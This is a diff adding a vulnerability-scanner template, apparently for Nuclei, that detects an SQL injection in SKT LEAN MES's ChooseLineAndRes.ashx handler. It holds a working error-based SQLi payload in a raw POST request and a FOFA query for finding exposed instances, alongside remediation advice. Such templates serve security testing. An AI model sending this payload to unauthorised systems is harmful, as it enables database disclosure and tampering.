@@ -1,0 +1,53 @@
+id: leanmes-chooselineandres-sqli
+
+info:
+  name: SKT LEAN MES /Handler/ChooseLineAndRes.ashx - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    SKT LEAN MES (Lean Manufacturing Execution System) contains a SQL injection vulnerability in
+    /Handler/ChooseLineAndRes.ashx. The ModelName parameter is concatenated into a SQL query without
+    proper sanitization or parameterization when type=GetPDAFunction, allowing attackers to extract
+    sensitive database information or perform unauthorized database operations.
+  remediation: |
+    - Apply the vendor patch/upgrade to a fixed version as soon as it is available.
+    - Enforce strict input validation for type and ModelName and use parameterized queries (prepared statements).
+    - Restrict public access to /Handler/ChooseLineAndRes.ashx (internal/admin network only) and add WAF rules for SQLi.
+    - Monitor logs for repeated error-based SQLi probes and block offending sources.
+  impact: |
+    Successful exploitation may lead to disclosure of database contents, unauthorized data modification,
+    and in some cases service disruption due to database errors or heavy query execution.
+  reference:
+    - https://mrxn.net/jswz/lean-mes-ChooseLineAndRes-sqli.html
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: skt
+    product: lean-mes
+    verified: false
+    max-request: 1
+    fofa-query: (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+  tags: 深科特-LEAN-MES
+
+http:
+  - raw:
+      - |
+        POST /Handler/ChooseLineAndRes.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        type=GetPDAFunction&ModelName=' and 1<db_name()--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'nvarchar'
+          - '转换成数据类型'
+        condition: and
+
+      - type: status
+        status:
+          - 500
